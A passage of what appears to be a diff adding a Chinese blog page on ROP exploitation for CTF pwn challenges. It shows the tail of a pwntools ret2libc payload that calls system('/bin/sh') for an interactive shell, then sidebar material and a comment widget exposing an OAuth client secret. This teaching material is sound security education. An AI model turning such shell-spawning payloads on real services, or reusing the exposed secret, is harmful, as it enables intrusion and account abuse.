class="line">payload += p64(binsh_addr)			<span class="hljs-comment">#system函数参数</span></span><br><span class="line">payload += p64(system_addr)			<span class="hljs-comment">#调用system()执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="⌛待更新…"><a href="#⌛待更新…" class="headerlink" title="⌛待更新…"></a>⌛待更新…</h3>
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="has-link-grey -link-link" href="/tags/ROP/" rel="tag">ROP</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="https://i.loli.net/2019/05/23/5ce5fdeb000d038958.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="https://i.loli.net/2019/05/23/5ce5fe0b02b4697663.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/10/IDA-Pro%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">IDA Pro远程调试</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/10/Shell-code%E7%9A%84%E7%BC%96%E5%86%99%E5%92%8C%E5%88%A9%E7%94%A8/">
+                <span class="level-item">Shellcode的编写和利用</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://jjeejj.github.io/css/gitment.css">
+<script src="https://jjeejj.github.io/js/gitment.js"></script>
+
+<script>
+	var gitment = new Gitment({
+		id: '2018/10/二进制安全之ROP/',
+		owner: 'Hvnt3r',
+		repo: 'hvnt3r.github.io',
+		oauth: {
+			client_id: 'e1edad34df70b78823cc',
+			client_secret: 'fe3bc3166e65ec3a38c6f77ada693deb62c3e8a4',
+		},
+	})
+	gitment.render('comment-container')
+</script>
+
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    
+                        <img class="image is-128x128 has-mb-6" src="/images/Hvnt3r.jpg" alt="Hvnt3r">
+                    
+                    
+                    <p class="is-size-4 is-block">
+                        Hvnt3r
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        让我们来猎杀那些陷入黑暗中的人吧
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>地球，银河系</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        74
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        19
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        81
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/Hvnt3r" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/Hvnt3r">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="https://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="https://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="https://hvnt3r.top/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+<div class="card widget" id="toc">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                目录
+            </h3>
+            <ul class="menu-list"><li>
+        <a class="is-flex" href="#64位ELF的ROP">
+        <span class="has-mr-6">1</span>
+        <span>64位ELF的ROP</span>
+        </a></li><li>
+        <a class="is-flex" href="#无system函数时调用int-0x80完成ROP">
+        <span class="has-mr-6">2</span>
+        <span>无system函数时调用int 0x80完成ROP</span>
+        </a></li><li>
+        <a class="is-flex" href="#使用Got表中的函数进行ROP">
+        <span class="has-mr-6">3</span>
+        <span>使用Got表中的函数进行ROP</span>
+        </a></li><li>
+        <a class="is-flex" href="#ROP之ret2libc">
+        <span class="has-mr-6">4</span>
+        <span>ROP之ret2libc</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#⌛待更新…">
+        <span class="has-mr-6">4.1</span>
+        <span>⌛待更新…</span>
+        </a></li></ul></li></ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            链接
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://www.yof3ng.xyz" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">Yof3ng</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.yof3ng.xyz</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://ne2ha.top" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">yoloyanng</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">ne2ha.top</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/APT/">
+            <span class="level-start">
+                <span class="level-item">APT</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">13</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/CVE/">
+            <span class="level-start">
+                <span class="level-item">CVE</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Docker/">
+            <span class="level-start">
+                <span class="level-item">Docker</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Linux/">
+            <span class="level-start">
+                <span class="level-item">Linux</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Python/">
+            <span class="level-start">
+                <span class="level-item">Python</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/VPN/">
+            <span class="level-start">
+                <span class="level-item">VPN</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/WEB%E5%AE%89%E5%85%A8/">
+            <span class="level-start">
+                <span class="level-item">WEB安全</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/">
+            <span class="level-start">
+                <span class="level-item">Windows恶意代码</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+            <span class="level-start">
+                <span class="level-item">二进制安全</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">33</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/">
+            <span class="level-start">
+                <span class="level-item">信息安全学习路径</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/">
+            <span class="level-start">
+                <span class="level-item">入侵检测</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E5%8F%8D%E5%A4%96%E6%8C%82/">
+            <span class="level-start">
+                <span class="level-item">反外挂</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E5%AE%89%E5%85%A8/">
+            <span class="level-start">
+                <span class="level-item">工业控制安全</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E6%80%9D%E8%80%83/">
+            <span class="level-start">
+                <span class="level-item">思考</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
+            <span class="level-start">
+                <span class="level-item">操作系统</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E6%97%A5%E5%B8%B8%E6%8C%96%E5%9D%91/">
+            <span class="level-start">
+                <span class="level-item">日常挖坑</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+            <span class="level-start">
+                <span class="level-item">渗透测试</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/%E7%94%9F%E6%B4%BB/">
+            <span class="level-start">
+                <span class="level-item">生活</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">3</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/2018%E5%B9%B4%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" style="font-size: 10px;">2018年工业信息安全技能大赛</a> <a href="/tags/2018%E6%8A%A4%E7%BD%91%E6%9D%AF/" style="font-size: 10px;">2018护网杯</a> <a href="/tags/APT/" style="font-size: 11.25px;">APT</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/CVE/" style="font-size: 12.5px;">CVE</a> <a href="/tags/CrackMe/" style="font-size: 11.25px;">CrackMe</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/DLL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">DLL注入</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/IDA/" style="font-size: 10px;">IDA</a> <a href="/tags/IDA-Pro/" style="font-size: 10px;">IDA Pro</a> <a href="/tags/IDS/" style="font-size: 10px;">IDS</a> <a href="/tags/IoT/" style="font-size: 10px;">IoT</a> <a href="/tags/Kali-Linux/" style="font-size: 10px;">Kali Linux</a> <a href="/tags/Linux/" style="font-size: 13.75px;">Linux</a> <a href="/tags/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/" style="font-size: 10px;">Linux动态链接库</a> <a href="/tags/Linux%E5%AD%90%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">Linux子系统</a> <a href="/tags/OllyDbg/" style="font-size: 10px;">OllyDbg</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/PWN/" style="font-size: 18.75px;">PWN</a> <a href="/tags/PwnTools/" style="font-size: 10px;">PwnTools</a> <a href="/tags/Pwnable-kr/" style="font-size: 10px;">Pwnable.kr</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Reverse/" style="font-size: 10px;">Reverse</a> <a href="/tags/ShellCode/" style="font-size: 11.25px;">ShellCode</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Slmail/" style="font-size: 10px;">Slmail</a> <a href="/tags/Snort/" style="font-size: 10px;">Snort</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/WinDbg/" style="font-size: 10px;">WinDbg</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/Windows%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/" style="font-size: 11.25px;">Windows恶意代码</a> <a href="/tags/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">Windows系统安全</a> <a href="/tags/Wordpress/" style="font-size: 11.25px;">Wordpress</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 15px;">二进制安全</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">信息安全</a> <a href="/tags/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/" style="font-size: 10px;">内核调试</a> <a href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" style="font-size: 10px;">分析报告</a> <a href="/tags/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/" style="font-size: 10px;">加壳与脱壳</a> <a href="/tags/%E5%8A%A0%E5%AF%86/" style="font-size: 10px;">加密</a> <a href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/" style="font-size: 12.5px;">动态分析</a> <a href="/tags/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">动态分析技术</a> <a href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" style="font-size: 10px;">动态调试</a> <a href="/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/" style="font-size: 10px;">反汇编</a> <a href="/tags/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">反虚拟机技术</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size: 11.25px;">反调试</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%B1%80%E5%8A%BF/" style="font-size: 10px;">安全局势</a> <a href="/tags/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" style="font-size: 10px;">安全竞赛</a> <a href="/tags/%E5%B0%8F%E7%AA%8D%E9%97%A8/" style="font-size: 10px;">小窍门</a> <a href="/tags/%E5%B7%A5%E4%B8%9A%E6%8E%A7%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;">工业控制安全</a> <a href="/tags/%E5%BF%83%E5%BE%97/" style="font-size: 11.25px;">心得</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" style="font-size: 20px;">恶意代码分析</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/" style="font-size: 11.25px;">恶意代码分析实战</a> <a href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/" style="font-size: 10px;">恶意代码启动方式</a> <a href="/tags/%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/" style="font-size: 10px;">恶意行为分析</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/" style="font-size: 10px;">数据包分析</a> <a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">木马</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a> <a href="/tags/%E6%A1%8C%E9%9D%A2/" style="font-size: 10px;">桌面</a> <a href="/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">模糊测试</a> <a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">汇编语言</a> <a href="/tags/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">游戏安全</a> <a href="/tags/%E7%89%B9%E6%B4%9B%E4%BC%8A%E6%9C%A8%E9%A9%AC%E5%8C%96%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">特洛伊木马化技术</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a> <a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 10px;">破解</a> <a href="/tags/%E7%A6%BB%E7%BA%BF%E7%BF%BB%E8%AF%91/" style="font-size: 10px;">离线翻译</a> <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">编程</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E8%AF%86%E5%88%AB/" style="font-size: 10px;">网络流量识别</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size: 10px;">自动化</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/" style="font-size: 10px;">虚拟化</a> <a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 10px;">调试</a> <a href="/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">进程注入</a> <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/" style="font-size: 10px;">远程控制</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 16.25px;">逆向</a> <a href="/tags/%E9%98%B2%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">防反汇编技术</a> <a href="/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" style="font-size: 11.25px;">静态分析</a>
+    </div>
+</div>
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2020/02/AFL%E5%88%9D%E4%BD%93%E9%AA%8C/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/gallery/thumbnails/afl-fuzz.png" alt="AFL初体验">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-02-23T14:19:17.000Z">2020-02-23</time></div>
+                    <a href="/2020/02/AFL%E5%88%9D%E4%BD%93%E9%AA%8C/" class="has-link-black-ter is-size-6">AFL初体验</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/gallery/thumbnails/wallhaven-6kegww.jpg" alt="攻防世界PWN高手进阶区">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-11-23T12:00:04.000Z">2019-11-23</time></div>
+                    <a href="/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="has-link-black-ter is-size-6">攻防世界PWN高手进阶区</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA%E9%A2%98%E7%9B%AE/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/gallery/thumbnails/pwn-for-fun.jpg" alt="攻防世界PWN新手练习区题目">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-09-18T15:53:40.000Z">2019-09-18</time></div>
+                    <a href="/2019/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA%E9%A2%98%E7%9B%AE/" class="has-link-black-ter is-size-6">攻防世界PWN新手练习区题目</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/gallery/thumbnails/linux.jpg" alt="Linux动态链接库.so的生成与使用">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-08-07T12:56:01.000Z">2019-08-07</time></div>
+                    <a href="/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="has-link-black-ter is-size-6">Linux动态链接库.so的生成与使用</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Linux/">Linux</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/08/Pwnable-kr-Part-1-15-21/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/gallery/thumbnails/pwnable_1.jpg" alt="Pwnable.kr_Part_1_15/21">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-08-06T15:09:11.000Z">2019-08-06</time></div>
+                    <a href="/2019/08/Pwnable-kr-Part-1-15-21/" class="has-link-black-ter is-size-6">Pwnable.kr_Part_1_15/21</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/08/">
+                <span class="level-start">
+                    <span class="level-item">八月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/07/">
+                <span class="level-start">
+                    <span class="level-item">七月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">10</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">12</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">11</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">22</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/2018%E5%B9%B4%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/">
+                        <span class="tag">2018年工业信息安全技能大赛</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
